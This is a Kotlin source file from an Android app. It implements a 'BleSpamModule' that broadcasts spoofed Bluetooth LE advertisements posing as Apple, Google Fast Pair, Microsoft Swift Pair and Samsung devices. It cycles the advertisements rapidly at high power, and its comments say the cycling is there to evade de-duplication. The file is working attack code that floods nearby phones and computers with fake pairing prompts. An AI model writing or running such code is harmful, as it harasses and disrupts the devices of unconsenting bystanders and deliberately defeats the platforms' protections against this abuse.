package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.util.UUID

data class SpamPayload(
    val type: PayloadType,
    val name: String,
    val manufacturerId: Int? = null,
    val serviceUuid: ParcelUuid? = null,
    val data: ByteArray = byteArrayOf()
)

enum class PayloadType {
    APPLE_CONTINUITY,
    GOOGLE_FAST_PAIR,
    MICROSOFT_SWIFT_PAIR,
    SAMSUNG_EASY_SETUP
}

class BleSpamModule(private val context: Context) {

    private val bluetoothAdapter: BluetoothAdapter? = (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
    private var advertiser: BluetoothLeAdvertiser? = bluetoothAdapter?.bluetoothLeAdvertiser

    private val _isAdvertising = MutableStateFlow(false)
    val isAdvertising: StateFlow<Boolean> = _isAdvertising

    private var advertisingJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    private val advertiseCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
            super.onStartSuccess(settingsInEffect)
            Log.d("BleSpam", "Advertising started successfully")
        }

        override fun onStartFailure(errorCode: Int) {
            super.onStartFailure(errorCode)
            Log.e("BleSpam", "Advertising failed: $errorCode")
            // If we fail, we might want to stop the loop or report error
        }
    }

    @SuppressLint("MissingPermission")
    fun startSpam(payloadType: PayloadType) {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            Log.e("BleSpam", "Bluetooth not enabled")
            return
        }
        advertiser = bluetoothAdapter.bluetoothLeAdvertiser // Refresh advertiser
        if (advertiser == null) {
             Log.e("BleSpam", "BLE Advertiser not available")
             return
        }

        if (_isAdvertising.value) return
        _isAdvertising.value = true

        val payloads = generatePayloads(payloadType)

        advertisingJob = scope.launch {
            while (_isAdvertising.value) {
                // To simulate MAC rotation and evade de-duplication, we stop and start frequently
                // and potentially cycle through slightly different payloads if available.

                payloads.forEach { payload ->
                    if (!_isAdvertising.value) return@forEach

                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false) // We don't want connections, just notifications
                        .build()

                    val dataBuilder = AdvertiseData.Builder()
                        .setIncludeDeviceName(false)
                        .setIncludeTxPowerLevel(false)

                    payload.manufacturerId?.let {
                        dataBuilder.addManufacturerData(it, payload.data)
                    }
                    payload.serviceUuid?.let {
                        dataBuilder.addServiceUuid(it)
                        // Some protocols use service data associated with the UUID
                        if (payload.data.isNotEmpty() && payload.manufacturerId == null) {
                             dataBuilder.addServiceData(it, payload.data)
                        }
                    }

                    val advertiseData = dataBuilder.build()

                    try {
                        Log.d("BleSpam", "Starting ad: ${payload.name}")
                        advertiser?.startAdvertising(settings, advertiseData, advertiseCallback)
                        delay(160) // Advertise for a short burst (e.g., 160ms)
                        advertiser?.stopAdvertising(advertiseCallback)
                        delay(50) // Short gap
                    } catch (e: Exception) {
                        Log.e("BleSpam", "Error in spam loop", e)
                    }
                }
            }
            stopSpamInternal()
        }
    }

    @SuppressLint("MissingPermission")
    fun stopSpam() {
        _isAdvertising.value = false
        advertisingJob?.cancel()
        stopSpamInternal()
    }

    @SuppressLint("MissingPermission")
    private fun stopSpamInternal() {
        try {
            advertiser?.stopAdvertising(advertiseCallback)
        } catch (e: Exception) {
            Log.e("BleSpam", "Error stopping advertising", e)
        }
    }

    private fun generatePayloads(type: PayloadType): List<SpamPayload> {
        return when (type) {
            PayloadType.APPLE_CONTINUITY -> listOf(
                // Apple - Airpods Pro
                SpamPayload(type, "AirPods Pro", manufacturerId = 0x004C, data = byteArrayOf(0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x2d, 0x3a, 0x05, 0x25, 0x45, 0xce.toByte(), 0x93.toByte(), 0x9c.toByte(), 0x24, 0x12, 0x6e, 0x3d)),
                // Apple - AirTags (Simplified)
                SpamPayload(type, "AirTag", manufacturerId = 0x004C, data = byteArrayOf(0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)),
                // Apple - Apple TV Setup
                SpamPayload(type, "Apple TV", manufacturerId = 0x004C, data = byteArrayOf(0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1.toByte(), 0x01, 0x60, 0x4c, 0x95.toByte(), 0x00, 0x00, 0x10, 0x00, 0x00, 0x00))
            )
            PayloadType.GOOGLE_FAST_PAIR -> listOf(
                // Generic Fast Pair
                SpamPayload(type, "Google Fast Pair", serviceUuid = ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), data = byteArrayOf(0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
            )
            PayloadType.MICROSOFT_SWIFT_PAIR -> listOf(
                // Microsoft Swift Pair (Simplified) - 0x0006 is Microsoft
                SpamPayload(type, "Swift Pair", manufacturerId = 0x0006, data = byteArrayOf(0x03, 0x00, 0x80.toByte()))
            )
             PayloadType.SAMSUNG_EASY_SETUP -> listOf(
                // Samsung - 0x0075
                SpamPayload(type, "Samsung Buds", manufacturerId = 0x0075, data = byteArrayOf(0x42, 0x09, 0x81.toByte(), 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09))
            )
        }
    }
}
